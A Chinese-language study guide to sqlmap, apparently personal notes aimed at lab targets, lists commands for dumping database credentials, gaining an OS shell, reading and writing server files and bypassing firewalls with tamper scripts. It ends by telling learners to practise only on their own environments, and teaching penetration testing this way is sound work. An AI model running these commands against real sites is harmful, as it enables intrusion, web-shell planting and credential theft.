# Sqlmap

# sqlmap基本命令

## SQLMAP（windows）

直接在含有sqlmap.py文件的文件夹查找栏里输入cmd打开命令行，输入sqlmap.py得到如图：

![image-20211201211354574](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/sqlmap%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4.assets/image-20211201211354574.png)

### 基本语句：

跑一下大概的信息

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13即发现的注入点"
```

```
-u
#URL 探测这个网址和系统的最基本信息
```

```
Ctrl+C
#打断进程
```

```
#很卡的原因：每次访问都相当于第一次打开（TCP慢启动机制，如果每次发包太快会被怀疑有问题然后被拦截）
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --keep-alive

--keep-alive
#保持链接常开状态，保持会话，但有被防火墙发现和拦截的风险
```

```
中途有跳出询问的语句，可以直接回车
```

判断一下是否是数据库管理员

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --is-dba
```

（如果是数据库管理员，则可以跳过查看数据库内容——因为知道数据库名是为了看表，现在就可以直接看所有表名，不过查询内容会较多）

查看一下所有的数据库

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --dbs

--dbs
#查看一下所有的数据库
```

查看当前所用的数据库

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --current-db

--current-db
#查看当前所用的数据库
```

列出当前数据库的表名

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --tables -D xycms

-D xycms
#指定数据库名为xycms
--tables
#列出当前数据库的表名
```

查看表的列名

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --columns -T manage_user -D xycms

-T manage_user
#指定表名manage_user
--columns
#查看表的列名
```

查看字段

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --dump -C m_name,m_pwd -T  manage_user -D xycms

-C m_name,m_pwd
#指定列名m_name和m_pwd
--dump
#查看字段
```

执行系统命令

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --os-shell

--os-shell
#执行系统命令——自己探测其根目录地址，写入一个php文件，然后让php文件帮我们执行某些命令——可能失败
```

执行sql语句

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --sql-shell

--sql-shell
#执行sql语句
```

读取文件

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --file-read="C:\phpStudy\WWW\index.php"

--file-read="C:\phpStudy\WWW\index.php"
#读取文件
```

写入文件

```
sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --file-write="C:\1.php" --file-dest="C:\phpStudy\WWW\xxx.php"

--file-write="C:\1.php" --file-dest="C:\phpStudy\WWW\xxx.php"
#写入文件
```





# sqlmap使用

环境是Python2.7（linux）



## 关于linux基础配置：

linux里：

打开Python环境和退出：

![image-20220118183258182](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8.assets/image-20220118183258182.png)

查看Python3现已安装的版本【python3按两下tab键】：

![image-20220118183428684](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8.assets/image-20220118183428684.png)



linux里安装sqlmap的命令：

```
pip install sqlmap
```

Linux的软件商店有：yum、apt、（npm、composer、pip），前两者是在操作系统里的，后面的是比较有针对性的。



## sqlmap标准流程：

```
--technique BETS
E = error 报错注入
T = time 时间注入
B = blind 盲注
S 标准
```





对于你觉得有注入点的网址：【注入点——加反斜杠会出东西的地方】

`http://sqlilabs.njhack.xyz:8080/Less-1/?id=2`

1. 进入sqlmap

```
sqlmap
```

2. 对这个网址进行基本信息扫描判断是否能打

```
sqlmap -u "目标注入点" --dbs

sqlmap -u "http://sqlilabs.njhack.xyz:8080/Less-1/?id=2" --dbs
```

3. 让sqlmap去猜解某数据库里面有多少表

```
sqlmap -u "目标注入点" -D security --tables
```

4. 查看表的列名

```
sqlmap -u "目标注入点" -D security -T users --columns

sqlmap -u "http://127.0.0.1/showproducts.php?id=13" --columns -T manage_user -D xycms

-T manage_user
#指定表名manage_user
--columns
#查看表的列名
```

5. 查看字段

```
sqlmap -u "目标注入点" -D security -T users -C username,password --dump

sqlmap.py -u "http://127.0.0.1/showproducts.php?id=13" --dump -C m_name,m_pwd -T  manage_user -D xycms

-C m_name,m_pwd
#指定列名m_name和m_pwd
--dump
#查看字段
```



## 报错注入

```
sqlmap -u "目标注入点" --current-db --batch --threads 10 --technique E

--current-db
#查看当前所用的数据库
--batch
#忽略一些错误
--threads 10
#线程设置为10
--technique E
#注入方式——errorbased的报错注入技术
```



## post方面

```
*标识哪里，就是用sqlmap对哪里进行打击
```



```
sqlmap -u "目标注入点" --data "uname=admin*&passwd=admin&submit=Submit" --dbs --batch --threads 10 --technique E
```



## http头注入

```
sqlmap -u "目标注入点" --user-agent="http头信息*" --level 4 --dbs --batch --threads 10 --technique E
```



### 也可以配合神器

先提交数据抓包，右击，copy to file保存到shuju.txt文件，然后放行，找到本地保存得到的txt文件，在要打的地方输入*，保存关闭，然后将文件放到sqlmap所在的本地，用sqlmap读文件。

```
sqlmap -r "/root/shuju.txt" --dbs --batch --threads 10 --technique E

读当前目录下的文件
```





![image-20220119003750722](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8.assets/image-20220119003750722.png)

![image-20220119003909650](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8.assets/image-20220119003909650.png)



## cookie注入

```
sqlmap -u "目标注入点" --cookie="cookie信息uname=admin*;..." --level 4 --dbs --batch --threads 10 --technique BETS或者E
```





## 读取文件

```
sqlmap -u "目标注入点" --file-read "文件名【可以包含路径】"
```



## 写入文件

```
sqlmap -u "目标注入点" --file-write "文件名" --file-dest "文件名【包含】"
```





# sqlmap常用命令总结：

注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行）

## 1、注入六连：

1.   sqlmap -u  "http://www.xx.com?id=x"    【查询是否存在注入点

2.   --dbs         【检测站点包含哪些数据库

3.   --current-db    【获取当前的数据库名

4.   --tables -D "db_name"  【获取指定数据库中的表名 -D后接指定的数据库名称

5.   --columns  -T "table_name" -D "db_name"  【获取数据库表中的字段

6.   --dump -C "columns_name" -T "table_name" -D "db_name"  【获取字段的数据内容

## 2、COOKIE注入：

sqlmap -u "http://www.xx.com?id=x" --cookie "cookie" --level 2  【cookie注入 后接cookie值

## 3、POST注入：

（1）目标地址http:// www.xxx.com /login.asp
（2）打开brup代理。
（3）点击表单提交
（4）burp获取拦截信息（post）
（5）右键保存文件（.txt）到指定目录下
（6）运行sqlmap并执行如下命令：
用例：sqlmap -r okay.txt  -p  username

// -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）

（7）自动获取表单：--forms自动获取表单

例如：sqlmap -u www.xx.com/login.asp --forms

（8）指定参数搜索：--data

例如:sqlmap -u www.xx.com/login.asp --data "username=1"

## 4、常用指令：

1.    --purge      【重新扫描（--purge 删除原先对该目标扫描的记录）

2.    --tables      【获取表名

3.    --dbs         【检测站点包含哪些数据库

4.    --current-db    【获取当前的数据库名

5.    --current-user  【检测当前用户

6.    --is-dba   【判断站点的当前用户是否为数据库管理员

7.    --batch      【默认确认，不询问你是否输入

8.    --search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）

9.    --threads 10  【线程，sqlmap线程最高设置为10

10.    --level 3        【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头
                                  的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5
11.    --risk 3           【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全

12.    -v   【详细的等级(0-6)
         0：只显示Python的回溯，错误和关键消息。
         1：显示信息和警告消息。
         2：显示调试消息。
         3：有效载荷注入。
         4：显示HTTP请求。
         5：显示HTTP响应头。
         6：显示HTTP响应页面的内容

13.    --privileges  【查看权限

14.    --tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件

15.    --method "POST" --data "page=1&id=2"   【POST方式提交数据

16.    --threads number　　【采用多线程 后接线程数

17.    --referer  ""  【使用referer欺骗

18.    --user-agent ""     【自定义user-agent

19.    --proxy “目标地址″   【使用代理注入

 

## sqlmap常用路径：

1. 添加表字段的目录在/usr/share/sqlmap/txt/common-tables.txt

2. 存放扫描记录的目录在/root/.sqlmap/output

 

## 环境准备：

1. Vmware虚拟机

2. 渗透环境：Kali linux （本地版本2018.4）（windows下安装python2和sqlmap也可进行实验）

3. web环境：windos2003 server

(建议学习搭建自己的web环境进行实验攻击，切勿拿别人网站做实验)




参考原文链接：https://blog.csdn.net/qq_37964989/article/details/84109094

